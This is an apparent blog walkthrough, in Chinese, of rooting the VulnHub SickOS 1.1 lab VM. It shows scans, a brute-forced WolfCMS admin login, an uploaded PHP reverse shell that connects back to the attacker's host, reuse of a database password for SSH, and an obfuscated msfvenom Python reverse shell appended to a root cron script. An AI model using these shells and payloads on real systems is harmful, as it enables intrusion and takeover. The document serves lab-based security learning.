---
title: Vulnhub-SickOS 1 1
published: 2025-03-09
tags: [Vulnhub]
category: 靶机
draft: false
---

# SickOS 1.1

> [https://www.vulnhub.com/entry/sickos-11,132/](https://www.vulnhub.com/entry/sickos-11,132/)
> 

## 主机发现端口扫描

1. 探测存活主机，`136`是靶机，因为靶机是我最后添加的
    
    ```php
    nmap -sP 192.168.75.0/24
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-22 11:36 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00038s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00031s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.136
    Host is up (0.00049s latency).
    MAC Address: 00:0C:29:62:FB:04 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00027s latency).
    MAC Address: 00:50:56:F8:B3:1A (VMware)
    Nmap scan report for 192.168.75.131
    Host is up.
    ```
    
2. 扫描靶机所有开放端口 
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.136 
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-22 11:41 CST
    Nmap scan report for 192.168.75.136
    Host is up (0.00075s latency).
    Not shown: 65532 filtered tcp ports (no-response)
    PORT     STATE  SERVICE
    22/tcp   open   ssh
    3128/tcp open   squid-http
    8080/tcp closed http-proxy
    MAC Address: 00:0C:29:62:FB:04 (VMware)
    ```
    
3. 查看服务版本以及系统版本
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.136 
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-22 11:41 CST
    Nmap scan report for 192.168.75.136
    Host is up (0.00075s latency).
    Not shown: 65532 filtered tcp ports (no-response)
    PORT     STATE  SERVICE
    22/tcp   open   ssh
    3128/tcp open   squid-http
    8080/tcp closed http-proxy
    MAC Address: 00:0C:29:62:FB:04 (VMware)
    ```
    
4. 使用脚本扫描漏洞
    
    ```php
    nmap -script=vuln -p 22,3128,8080 192.168.75.136 -oA Desktop/test/vuln
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-22 11:46 CST
    Nmap scan report for 192.168.75.136
    Host is up (0.00085s latency).
    
    PORT     STATE  SERVICE
    22/tcp   open   ssh
    3128/tcp open   squid-http
    8080/tcp closed http-proxy
    MAC Address: 00:0C:29:62:FB:04 (VMware)
    ```
    

## web渗透

- 只有8080是关闭的，打开的只有`3128` 端口运行着squid代理服务和ssh，访问`3128` ，返回
    
    ```php
    ERROR
    The requested URL could not be retrieved
    The following error was encountered while trying to retrieve the URL: /
        Invalid URL
    Some aspect of the requested URL is incorrect.
    Some possible problems are:
        Missing or incorrect access protocol (should be "http://" or similar)
        Missing hostname
        Illegal double-escape in the URL-Path
        Illegal character in hostname; underscores are not allowed.
    Your cache administrator is webmaster.
    Generated Sun, 22 Sep 2024 06:03:35 GMT by localhost (squid/3.1.19)
    ```
    
    可知版本是`3.1.19` ，因为他是个代理服务器，所以可能会代理着什么，可能就是`80`端口
    
- 因为我的火狐连接着的是burp的代理地址，假如想要再通过代理访问别的网站并且能抓包的话，就需要设置burp上游代理服务器
    
    大概在：`network->connection->upstreamserver` 把代理地址`192.168.75.136:3128` 添加上去即可
    
- 访问`192.168.75.136` ，页面有回显了，那就表示`80`在`192.168.75.136:3128` 下代理着
    
    ```php
    # 内容
    BLEHHH!!! 
    ```
    
    是个网路用词
    
- 扫描目录，需要指定代理服务器
    
    ```php
    python .\dirsearch.py -u http://192.168.75.136 --proxy 192.168.75.136:3128
    //
    [12:15:18] 403 -  243B  - /cgi-bin/
    [12:15:19] 200 -  109B  - /connect
    [12:15:20] 403 -  239B  - /doc/
    [12:15:20] 403 -  242B  - /doc/api/
    [12:15:20] 403 -  247B  - /doc/html/index.html
    [12:15:20] 403 -  249B  - /doc/en/changes.html
    [12:15:20] 403 -  247B  - /doc/stable.version
    [12:15:29] 200 -   58B  - /robots.txt
    [12:15:30] 403 -  242B  - /server-status
    [12:15:30] 403 -  242B  - /server-status/
    ```
    
    发现`robots.txt`以及`connect`
    
    1. `connect`内容
        
        ```php
        #!/usr/bin/python
        
        print "I Try to connect things very frequently\n"
        print "You may want to try my services"
        ```
        
    2. `robots.txt` 内容
        
        ```php
        User-agent: *
        Disallow: /
        Dissalow: /wolfcms
        ```
        
        给我们提示`wolfcms`
        
- 访问`/wolfcms` ，是一个内容管理cms，爆破目录
    
    ```php
    python .\dirsearch.py -u http://192.168.75.136/wolfcms --proxy 192.168.75.136:3128
    //
    [12:18:17] 200 -  403B  - /wolfcms/composer.json
    ....
    [12:18:17] 200 -    4KB - /wolfcms/CONTRIBUTING.md
    [12:18:18] 301 -  253B  - /wolfcms/docs  ->  http://192.168.75.136/wolfcms/docs/
    [12:18:18] 200 -  512B  - /wolfcms/docs/
    [12:18:18] 200 -    2KB - /wolfcms/docs/updating.txt
    [12:18:19] 200 -  894B  - /wolfcms/favicon.ico
    [12:18:26] 301 -  257B  - /wolfcms/public  ->  http://192.168.75.136/wolfcms/public/
    [12:18:26] 200 -  462B  - /wolfcms/public/
    [12:18:26] 200 -    2KB - /wolfcms/README.md
    [12:18:27] 200 -   20B  - /wolfcms/robots.txt
    ```
    
    发现`robots.txt`以及`readme.md`
    
    访问后`robots.txt` 是空的，`readme.md` 为配置说明
    
- 通过查阅得知后台登陆地址在`/wolfcms/?/admin/login`
    
    ![image.png](image%2012.png)
    
    网路搜索默认账号密码尝试，登陆失败
    
    使用burp进行爆破，指定账号为`admin` ，通过密码字典爆破
    
    爆破成功，账号密码都是 `admin`
    

## 获得初级shell

- 登陆进去后寻找可利用点，找到 `uploadfile`
    
    在 `file`→`Uploadfile`
    
- 上传反弹shell代码文件
    
    ```php
    //getshell.php
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.75.131/1234 0>&1'");?>
    ```
    
- 上传后点击文件，回显文件保存在 `/public/getshell.php`
    
    ![image.png](image%2013.png)
    
- 一步一步尝试发现文件在 `http://192.168.75.136/wolfcms/public/getshell.php`
    
    `kali` 开启监听
    
    ```php
    nc -lvp 1234                                                     
    listening on [any] 1234 ...
    ```
    
    访问 `http://192.168.75.136/wolfcms/public/getshell.php`
    
    反弹shell成功
    
- 查看其权限
    
    ```php
    listening on [any] 1234 ...
    192.168.75.136: inverse host lookup failed: Unknown host
    connect to [192.168.75.131] from (UNKNOWN) [192.168.75.136] 52339
    //
    www-data@SickOs:/var/www/wolfcms/public$ dpkg -l
    ...
    //
    www-data@SickOs:/var/www/wolfcms/public$ sudo -l
    sudo: no tty present and no askpass program specified
    Sorry, try again.
    sudo: no tty present and no askpass program specified
    Sorry, try again.
    sudo: no tty present and no askpass program specified
    Sorry, try again.
    sudo: 3 incorrect password attempts
    //
    www-data@SickOs:/var/www/wolfcms/public$ uname -a
    Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
    ```
    
    权限不高，系统名是`SickOs` 内核版本是`3.11.0-15`
    

## 提权

- 因为wolf是cms，肯定会存在与数据库连接的文件，找到`config.php` 文件
    
    ```php
    cat /var/www/wolfcms/config.php
    //
    <?php 
    
    // Database information:
    // for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
    // The path can only be absolute path or :memory:
    // For more info look at: www.php.net/pdo
    
    // Database settings:
    define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
    define('DB_USER', 'root');
    define('DB_PASS', 'john@123');
    define('TABLE_PREFIX', '');
    .....
    ```
    
    发现数据库用户名为`root`，密码为`john@123`
    
    改密码有可能也是系统上某个用户的密码
    
- 查看`/etc/passwd`  寻找可疑用户
    
    ```php
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
    bin:x:2:2:bin:/bin:/bin/sh
    sys:x:3:3:sys:/dev:/bin/sh
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/bin/sh
    man:x:6:12:man:/var/cache/man:/bin/sh
    lp:x:7:7:lp:/var/spool/lpd:/bin/sh
    mail:x:8:8:mail:/var/mail:/bin/sh
    news:x:9:9:news:/var/spool/news:/bin/sh
    uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
    proxy:x:13:13:proxy:/bin:/bin/sh
    www-data:x:33:33:www-data:/var/www:/bin/sh
    backup:x:34:34:backup:/var/backups:/bin/sh
    list:x:38:38:Mailing List Manager:/var/list:/bin/sh
    irc:x:39:39:ircd:/var/run/ircd:/bin/sh
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
    nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
    libuuid:x:100:101::/var/lib/libuuid:/bin/sh
    syslog:x:101:103::/home/syslog:/bin/false
    messagebus:x:102:105::/var/run/dbus:/bin/false
    whoopsie:x:103:106::/nonexistent:/bin/false
    landscape:x:104:109::/var/lib/landscape:/bin/false
    sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
    sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
    mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
    ```
    
    发现可疑用户有 `root`，`www-data`，`bckup`，`sickos`
    
- 使用可疑用户进行ssh登录，密码使用`john@123` ，数据库链接上的密码
    
    最后`sickos` 成功登录
    
- 查看`sickos` 用户权限
    
    ```php
    sickos@SickOs:~$ sudo -l
    //
    [sudo] password for sickos: 
    Matching Defaults entries for sickos on this host:
        env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    
    User sickos may run the following commands on this host:
        (ALL : ALL) ALL
    ```
    
    等于root权限
    
- 读取flag
    
    ```php
    sickos@SickOs:~$ sudo /bin/bash
    root@SickOs:~# 
    //
    root@SickOs:/home# cd /root
    root@SickOs:/root# cat a0216ea4d51874464078c618298b1367.txt 
    If you are viewing this!!
    
    ROOT!
    
    You have Succesfully completed SickOS1.1.
    Thanks for Trying
    ```
    

## 另外一种提权思路

1. 查看定时任务`crontab` ，在`/etc/cron.d/` 里面存在一个`automate`
    
    内容是
    
    ```php
    www-data@SickOs:/etc/cron.d$ cat automate
    //
    * * * * * root /usr/bin/python /var/www/connect.py
    ```
    
    每分钟使用`root`执行`connect.py`
    
2. 可以往`connect.py` 添加反弹`shell`代码
3. 生成`py`的`payload`代码
    
    ```php
    msfvenom -p cmd/unix/reverse_python lhost=192.168.75.131 lport=1235 -f raw
    //
    [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
    [-] No arch selected, selecting arch: cmd from the payload
    No encoder specified, outputting raw payload
    Payload size: 364 bytes
    python -c "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqFkM0KwjAQhF8l5JSARJNSf5AcilQQUcH2XmyMtFib0E3fX0Paeuxehtn9dge2/ljTOQRGvbVDCC0Qgr60nVEaIHjz0z3yVRlwEvOdYHy9ZZuY8YjjcejvSC6ieGyADFdZEDK45Ficrmk+ZIVedjuciyy/p8mFTutMmbbVyhHicwPvQ+iEGGDP3goC7FU3ujWEBmo1S/BZQkyElf+PMPVoGoKXZd0uocL0C7l5Vrk=')[0])))
    ```
    
    因为crontab执行的是python文件，所以不用exec再套一遍python，所以到的就有
    
    ```php
    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqFkM0KwjAQhF8l5JSARJNSf5AcilQQUcH2XmyMtFib0E3fX0Paeuxehtn9dge2/ljTOQRGvbVDCC0Qgr60nVEaIHjz0z3yVRlwEvOdYHy9ZZuY8YjjcejvSC6ieGyADFdZEDK45Ficrmk+ZIVedjuciyy/p8mFTutMmbbVyhHicwPvQ+iEGGDP3goC7FU3ujWEBmo1S/BZQkyElf+PMPVoGoKXZd0uocL0C7l5Vrk=')[0])))
    ```
    
4. 把payload重定向到`connect.py` (`connect.py` 其实就是渗透阶段发现的`/connect` 目录里的内容)
    
    ```php
    echo "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqFkM0KwjAQhF8l5JSARJNSf5AcilQQUcH2XmyMtFib0E3fX0Paeuxehtn9dge2/ljTOQRGvbVDCC0Qgr60nVEaIHjz0z3yVRlwEvOdYHy9ZZuY8YjjcejvSC6ieGyADFdZEDK45Ficrmk+ZIVedjuciyy/p8mFTutMmbbVyhHicwPvQ+iEGGDP3goC7FU3ujWEBmo1S/BZQkyElf+PMPVoGoKXZd0uocL0C7l5Vrk=')[0])))" >> /var/www/connect.py
    ```
    
5. kali开启监听，等待代码执行
    
    获得`root`权限成功
    
    ```php
    nc -lvp 1235                                    
    listening on [any] 1235 ...
    //
    192.168.75.136: inverse host lookup failed: Unknown host
    connect to [192.168.75.131] from (UNKNOWN) [192.168.75.136] 51066
    
    python -c "import pty;pty.spawn('/bin/bash')"
    root@SickOs:~# 
    
    ```